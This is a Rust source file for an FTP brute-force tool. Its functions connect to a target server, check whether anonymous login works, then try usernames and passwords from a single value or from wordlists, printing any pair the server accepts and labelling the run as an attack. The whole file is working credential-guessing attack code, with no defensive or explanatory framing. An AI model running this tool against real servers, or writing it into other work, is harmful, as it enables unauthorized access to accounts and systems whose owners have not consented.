use std::str::from_utf8;
use std::process;
use std::net::{TcpStream};
use std::io::{Read, Write};


pub fn BruteFtpUserAndPass(user: String, pass: String, ip: String, port: &str) {
    println!("[+] Doing the test\n");

    let mut buffer = [0; 1024];
    let mut buffer2 = [0; 1024];

    let mut confirm = [0; 1024];
    let mut confirm2 = [0; 1024];

    let mut trash = [0; 1024];

    match TcpStream::connect(format!("{}:{}", ip, port)){
        Ok(mut stream) => {
            match stream.read(&mut buffer){
                Ok(response) => {
                    println!("[+] {}", from_utf8(&mut buffer[0..response]).unwrap());

                    stream.write("USER anonymous\r\n".as_bytes());
                    let _code = stream.read(&mut trash).unwrap();

                    stream.write("PASS anonymous\r\n".as_bytes());
                    
                    match stream.read(&mut confirm) {
                        Ok(_response) => {
                            if from_utf8(&mut confirm[0..3]).unwrap() == "230" {
                                println!("[+] Have Anonymous login !");
                                println!("Login: anonymous | Password: anonymous\n");
                                println!("[+] Continuing the attack !");
                            
                                match TcpStream::connect(format!("{}:{}", ip, port)){
                                    Ok(mut stream) => {
                                        let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                        stream.write(format!("USER {}\r\n", &user).as_bytes());
                                        let _code = stream.read(&mut trash).unwrap();
                                        
                                        stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                        match stream.read(&mut confirm2) {
                                            Ok(_size) => {
                                                if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                    println!("[+] Login: {} | Password: {}", &user, &pass);

                                                }else {
                                                    println!("[-] Login or Password incorrect");
    
                                                }

                                            },

                                            Err(_) => {
                                                println!("[-] Can't receive the response of FTP server");
                                                process::exit(1);

                                            },

                                        }

                                    }, 
                            
                                    Err(_) => {
                                        println!("[-] Connection Failed, can't stabilish a connection with the target");
                                        process::exit(1);

                                    }
                                }
                                                

                            }else {
                                println!("[-] Don't have Anonymous login !");
                                println!("[+] Continuing the attack !");

                                match TcpStream::connect(format!("{}:{}", ip, port)){
                                    Ok(mut stream) => {
                                        let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                        stream.write(format!("USER {}\r\n", &user).as_bytes());
                                        let _code = stream.read(&mut trash).unwrap();
                                        
                                        stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                        match stream.read(&mut confirm2) {
                                            Ok(_size) => {
                                                if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                    println!("[+] Login: {} | Password: {}", &user, &pass);

                                                }else {
                                                    println!("[-] Login or Password incorrect");
    
                                                }

                                            },

                                            Err(_) => {
                                                println!("[-] Can't receive the response of FTP server");
                                                process::exit(1);

                                            },

                                        }

                                    }, 
                            
                                    Err(_) => {
                                        println!("[-] Connection Failed, can't stabilish a connection with the target");
                                        process::exit(1);

                                    }
                                }
                            } 
                        },
                        Err(_) => {
                            println!("[-] Can't receive the initial response of FTP server");
                            process::exit(1);

                        }

                    }

                },
                Err(_) => {
                    println!("[-] Can't receive the banner of FTP application");
                    process::exit(1);

                },

            }

        },

        Err(_) => {
            println!("[-] Connection Failed, can't stabilish a connection with the target");
            process::exit(1);

        }

    }


}


pub fn BruteFtpUserListAndPass(userWordlist: Vec<&str>, pass: String, ip: String, port: &str) {
    println!("[+] Doing the brute-force attack\n");

    let mut buffer = [0; 1024];
    let mut buffer2 = [0; 1024];
    let mut buffer3 = [0; 1024];

    let mut confirm = [0; 1024];
    let mut confirm2 = [0; 1024];

    let mut trash = [0; 1024];

    match TcpStream::connect(format!("{}:{}", ip, port)){
        Ok(mut stream) => {
            match stream.read(&mut buffer){
                Ok(response) => {
                    println!("[+] {}", from_utf8(&mut buffer[0..response]).unwrap());

                    stream.write("USER anonymous\r\n".as_bytes());
                    let _code = stream.read(&mut trash).unwrap();

                    stream.write("PASS anonymous \r\n".as_bytes());
                    
                    match stream.read(&mut confirm) {
                        Ok(_response) => {
                            if from_utf8(&mut confirm[0..3]).unwrap() == "230" {
                                println!("[+] Have Anonymous login !");
                                println!("Login: anonymous | Password: anonymous\n");
                                println!("[+] Continuing the attack !");
                            
                                for user in userWordlist.iter(){                                   
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut buffer3).unwrap();
                                            
                                            if from_utf8(&mut buffer3[0..3]).unwrap() == "331"{
                                                println!("[+] User found: {}", &user);
                                                
                                                stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                                match stream.read(&mut confirm2) {
                                                    Ok(_size) => {
                                                        if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                            println!("[+] Login: {} | Password: {}", &user, &pass);
                                                            continue;

                                                        }else {
                                                            println!("[*] Tried {}", &user);
                                                            continue;

                                                        }
                                                    },

                                                    Err(_) => {
                                                        println!("[-] Can't receive the response of FTP server");
                                                        process::exit(1);

                                                    },

                                                }

                                            }else {
                                                continue;

                                            }

                                        }, 

                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }
                                    }
                                    
                                }

                            }else {
                                println!("[-] Don't have Anonymous login !\n");
                                println!("[+] Continuing the attack !");

                                for user in userWordlist.iter(){                                   
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut buffer3).unwrap();
                                            
                                            if from_utf8(&mut buffer3[0..3]).unwrap() == "331"{
                                                println!("[+] User found: {}", &user);
                                                
                                                stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                                match stream.read(&mut confirm2) {
                                                    Ok(_size) => {
                                                        if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                            println!("[+] Login: {} | Password: {}", &user, &pass);
                                                            continue;

                                                        }else {
                                                            println!("[*] Tried {}", &user);
                                                            continue;

                                                        }
                                                    },

                                                    Err(_) => {
                                                        println!("[-] Can't receive the response of FTP server");
                                                        process::exit(1);

                                                    },

                                                }

                                            }else {
                                                continue;

                                            }

                                        }, 

                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }
                                    }
                                    
                                }
                            } 
                            
                        },
                        Err(_) => {
                            println!("[-] Can't receive the initial response of FTP server");
                            process::exit(1);

                        }

                    }

                },

                Err(_) => {
                    println!("[-] Can't receive the banner of FTP application");
                    process::exit(1);

                },

            }

        },

        Err(_) => {
            println!("[-] Connection Failed, can't stabilish a connection with the target");
            process::exit(1);

        }

    }

}

pub fn BruteFtpUserAndPassList(user: String, passWordlist: Vec<&str>, ip: String, port: &str) {
    println!("[+] Doing the brute-force attack\n");

    let mut buffer = [0; 1024];
    let mut buffer2 = [0; 1024];

    let mut confirm = [0; 1024];
    let mut confirm2 = [0; 1024];

    let mut trash = [0; 1024];

    match TcpStream::connect(format!("{}:{}", ip, port)){
        Ok(mut stream) => {
            match stream.read(&mut buffer){
                Ok(response) => {
                    println!("[+] {}", from_utf8(&mut buffer[0..response]).unwrap());

                    stream.write("USER anonymous\r\n".as_bytes());
                    let _code = stream.read(&mut trash).unwrap();

                    stream.write("PASS anonymous \r\n".as_bytes());
                    
                    match stream.read(&mut confirm) {
                        Ok(_response) => {
                            if from_utf8(&mut confirm[0..2]).unwrap() == "230" {
                                println!("[+] Have Anonymous login !");
                                println!("Login: anonymous | Password: anonymous\n");
                                println!("[+] Continuing the attack !");
                            
                                for pass in passWordlist.iter() {
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut trash).unwrap();

                                            stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                            match stream.read(&mut confirm2) {
                                                Ok(_size) => {
                                                    if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                        println!("[+] Login: {} | Password: {}", &user, &pass);
                                                        continue;

                                                    }else {
                                                        println!("[*] Tried {}", &pass);
                                                        continue;

                                                    }

                                                },

                                                Err(_) => {
                                                    println!("[-] Can't receive the response of FTP server");
                                                    process::exit(1);

                                                },

                                            }

                                        }, 
                                
                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }
                                    }
                                }
                            
                            }else {
                                println!("[-] Don't have Anonymous login !");
                                println!("[+] Continuing the attack !");

                                for pass in passWordlist.iter() {                                  
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                
                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut trash).unwrap();

                                            stream.write(format!("PASS {}\r\n", &pass).as_bytes());

                                            match stream.read(&mut confirm2) {
                                                Ok(_size) => {
                                                    if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                        println!("[+] Login: {} | Password: {}", &user, &pass);
                                                        continue;

                                                    }else {
                                                        println!("[*] Tried {}", &pass);
                                                        continue;

                                                    }

                                                },

                                                Err(_) => {
                                                    println!("[-] Can't receive the response of FTP server");
                                                    process::exit(1);

                                                },

                                            }

                                        }, 
                                
                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }
                                    }
                                }
                            } 
                        },
                        Err(_) => {
                            println!("[-] Can't receive the initial response of FTP server");
                            process::exit(1);

                        }

                    }

                },

                Err(_) => {
                    println!("[-] Can't receive the banner of FTP application");
                    process::exit(1);

                },

            }

        },

        Err(_) => {
            println!("[-] Connection Failed, can't stabilish a connection with the target");
            process::exit(1);

        }

    }

}


pub fn BruteFtpUserListAndPassList(userWordlist: Vec<&str>, passWordlist: Vec<&str>, ip: String, port: &str){
    println!("[+] Doing the brute-force attack (can take time)");

    let mut buffer = [0; 1024];
    let mut buffer2 = [0; 1024];
    let mut buffer3 = [0; 1024];

    let mut confirm = [0; 1024];
    let mut confirm2 = [0; 1024];

    let mut trash = [0; 1024];

    match TcpStream::connect(format!("{}:{}", ip, port)){
        Ok(mut stream) => {
            match stream.read(&mut buffer){
                Ok(response) => {
                    println!("[+] {}", from_utf8(&mut buffer[0..response]).unwrap());

                    stream.write("USER anonymous\r\n".as_bytes());
                    let _code = stream.read(&mut trash).unwrap();

                    stream.write("PASS anonymous \r\n".as_bytes());
                    
                    match stream.read(&mut confirm) {
                        Ok(_response) => {
                            if from_utf8(&mut confirm[0..3]).unwrap() == "230" {
                                println!("[+] Have Anonymous login !");
                                println!("Login: anonymous | Password: anonymous\n");
                                println!("[+] Continuing the attack !");
                            
                                for user in userWordlist.iter(){
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();

                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut buffer3).unwrap();

                                            if from_utf8(&mut buffer3[0..3]).unwrap() == "331" {
                                                println!("[+] User found: {}", user);

                                                for pass in passWordlist.iter() {
                                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                                        Ok(mut stream) => {
                                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                            
                                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                                            let _code = stream.read(&mut trash).unwrap();
                                                            
                                                            stream.write(format!("PASS {}\r\n", &pass).as_bytes());
            
                                                            match stream.read(&mut confirm2) {
                                                                Ok(_size) => {
                                                                    if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                                        println!("[+] Login: {} | Password: {}", &user, &pass);
                                                                        continue;
            
                                                                    }else {
                                                                        println!("[*] Tried {}:{}", &user, &pass);
                                                                        continue;
            
                                                                    }
            
                                                                },
            
                                                                Err(_) => {
                                                                    println!("[-] Can't receive the response of FTP server");
                                                                    process::exit(1);
            
                                                                },
            
                                                            }
            
                                                        }, 
                                                        Err(_) => {
                                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                                            process::exit(1);
            
                                                        }
                                                    }

                                                }

                                            }else {
                                                continue;

                                            }

                                        },
                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }

                                    }

                                }

                            }else {
                                println!("[-] Don't have Anonymous login !\n");
                                println!("[+] Continuing the attack !");

                                for user in userWordlist.iter(){
                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                        Ok(mut stream) => {
                                            let _value: usize = stream.read(&mut buffer2).unwrap();

                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                            let _code = stream.read(&mut buffer3).unwrap();

                                            if from_utf8(&mut buffer3[0..3]).unwrap() == "331" {
                                                println!("[+] User found: {}", user);

                                                for pass in passWordlist.iter() {
                                                    match TcpStream::connect(format!("{}:{}", ip, port)){
                                                        Ok(mut stream) => {
                                                            let _value: usize = stream.read(&mut buffer2).unwrap();
                                                            
                                                            stream.write(format!("USER {}\r\n", &user).as_bytes());
                                                            let _code = stream.read(&mut trash).unwrap();
                                                            
                                                            stream.write(format!("PASS {}\r\n", &pass).as_bytes());
            
                                                            match stream.read(&mut confirm2) {
                                                                Ok(_size) => {
                                                                    if from_utf8(&mut confirm2[0..3]).unwrap() == "230" {
                                                                        println!("[+] Login: {} | Password: {}", &user, &pass);
                                                                        continue;
            
                                                                    }else {
                                                                        println!("[*] Tried {}:{}", &user, &pass);
                                                                        continue;
            
                                                                    }
            
                                                                },
            
                                                                Err(_) => {
                                                                    println!("[-] Can't receive the response of FTP server");
                                                                    process::exit(1);
            
                                                                },
            
                                                            }
            
                                                        }, 
                                                        Err(_) => {
                                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                                            process::exit(1);
            
                                                        }
                                                    }

                                                }

                                            }else {
                                                continue;

                                            }

                                        },
                                        Err(_) => {
                                            println!("[-] Connection Failed, can't stabilish a connection with the target");
                                            process::exit(1);

                                        }

                                    }

                                }

                            } 

                        },
                        Err(_) => {
                            println!("[-] Can't receive the initial response of FTP server");
                            process::exit(1);

                        }

                    }

                },

                Err(_) => {
                    println!("[-] Can't receive the banner of FTP application");
                    process::exit(1);

                },

            }

        },

        Err(_) => {
            println!("[-] Connection Failed, can't stabilish a connection with the target");
            process::exit(1);

        }

    }
    
}